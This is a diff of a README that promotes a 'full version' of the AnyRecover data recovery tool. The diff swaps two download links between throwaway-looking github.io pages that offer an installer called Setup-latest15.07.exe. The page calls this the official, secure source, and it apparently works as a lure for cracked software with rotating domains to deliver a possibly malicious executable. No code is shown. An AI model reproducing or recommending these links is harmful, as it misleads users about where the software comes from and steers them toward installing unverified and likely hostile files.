@@ -2,7 +2,7 @@
 
 AnyRecover is a powerful and user-friendly data recovery tool designed specifically for Windows desktops. With the AnyRecover full version, you can effortlessly restore deleted, formatted, or lost files from various storage devices, ensuring your valuable data is never permanently gone. This tool leverages advanced algorithms to provide a reliable recovery experience for both novice and expert users.
 
-[![Download AnyRecover](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=windows)](https://yellowtaxisave.github.io/download-page/)
+[![Download AnyRecover](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=windows)](https://capitals-707-bringing.github.io/download-page/)
 
 ## Key Features
 
@@ -60,6 +60,6 @@ These FAQs cover typical scenarios, but if you encounter other issues, check the
 
 To get started with AnyRecover, download the latest version directly from our secure GitHub page. This ensures you receive the most up-to-date features and security enhancements.
 
-[Download the latest version from GitHub](https://yellowtaxisave.github.io/download-page/)
+[Download the latest version from GitHub](https://capitals-707-bringing.github.io/download-page/)
 
 This link provides the official installer file, **Setup-latest15.07.exe**, optimized for Windows 10/11 systems. After downloading, follow the installation instructions above to set up the tool. Remember, AnyRecover is designed for legitimate data recovery purposes, helping you restore important files safely and efficiently. Last updated: 2026.
